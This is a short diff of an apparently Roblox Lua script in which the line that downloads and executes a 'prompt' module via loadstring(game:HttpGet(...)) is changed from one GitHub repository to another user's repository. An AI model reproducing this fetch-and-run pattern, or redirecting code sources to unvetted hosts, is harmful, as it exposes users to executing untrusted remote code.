@@ -45,7 +45,7 @@ local globalSuccess, globalResult = pcall(function()
 
 	local settingsCreated = false
 	local cachedSettings
-	local prompt = useStudio and require(script.Parent.prompt) or loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Sirius/refs/heads/request/prompt.lua'))()
+	local prompt = useStudio and require(script.Parent.prompt) or loadstring(game:HttpGet('https://raw.githubusercontent.com/axleoislost/rlfd/refs/heads/main/prompt.lua'))()
 	local function loadSettings()
 		local file = nil
 
